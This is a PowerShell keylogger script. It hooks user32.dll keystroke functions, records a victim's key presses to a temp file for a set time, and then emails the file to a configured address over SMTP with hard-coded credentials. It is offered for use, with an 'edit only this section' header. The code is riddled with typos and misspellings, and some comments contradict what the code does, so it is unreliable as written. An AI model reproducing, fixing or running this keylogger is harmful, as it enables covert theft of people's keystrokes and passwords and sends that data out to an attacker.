#edit only this section!

$TimeToRun = 2
$From = "user@gmail.com"
$Pass = "Pa$$w0rd"
$To = "user@gmail.com"
$Subject = "Keylogger Results"
$body = "Keylogger Results"
$SMTPServer = "smtp.mail.com"
$SMTPPort = "587"
$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlaiText -Force)

############################

$TimeStart = Get-Date
$TimeEnd = $TimeStart.addminutes($TimeToRun)

#requires -Version 2
function Start-Keylogger($Path="Senv:temp\keylogger.txt")
{
#Signatures for API Calls
$Signatures = @'
[D11Import("user32.dll", ChartSet=ChartSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode;
[dllImport("user32.dll", ChartSet=ChartSet.Auto)]
public static extern int GetAsyncKeyState (byte[] keystate);
[DllImport("user32.dll", ChartSet=ChartSet.Auto)]
public static extern int MapVirtualKey(unit uCode, int uMapType);
[DllImport("user32.dll", ChartSet=ChartSet.Auto)]
public static extern int MapVirtualKey(unit uCode, int uMapType);
[DllImport("user32.dll", ChartSet=ChartSet.Auto)]
public static extern int ToUnicode(unit wVirtKey, unit wScanCode, byte[] lpkestate, System.Text.StringBuilder pwszBuff, int cchBuff, unit wFlags );
'@

# load signatures and make members available
$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
# create output file
$null = New-Item -Path $Path -ItemType File -Force

try
{

 # create endless loop. When user presses CTRL+C, finally-block
 # executes and shows the collected key presses
 
 While ($TimeEnd -ge $TimeNow) {
 STart-Sleep -Miliseconds 40
 
 # scan all ASCII codes above 8 
 for ($ascii = 9; $ascii -le 254; $ascii++) {
 $state = $API::GetAsyncKeyState($ascii)
 
 # is key pressed?
 if ($state -eq -32767) {
 $null = [console]::CapsLock
 
 # translate scan code to real code 
 $virtuslKey = $API::MapVirtualKey($ascii, 3)
 
 # get keyboard state for virtual keys 
 $kbstate = new-object Byte[] 256
 $checkkbstate = $API::GetAsyncKeyState($kbstate)
 # prepare a StringBuilder to receipe input key
 $mychar = new-object -TypeName System.Text.StringBuilder
 # translate virtual key
 $success = $API::ToUnicode($ascii, $virtuslKey, $kbstate, $mychar, $mychar.Capacity, 0)
 if ($succes)
 {
 # add key to logger File
 [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
 }
 }
 }
 $TimeNow = Get-Date
 }
 }
 finally 
 {
 # open logger file in Notepad
 send-mailmessage -from $From -to $To -subject $Subject -body $body -Attachment $Path -smtpServer $SMTPServer -port $SMTPPort -credential $credentials ,usessl
 }
 }
 # records all key presses until script is aborted by pressing CTRL+C 
 # Will then open the file with collected key codes 
 Start-KeyLogger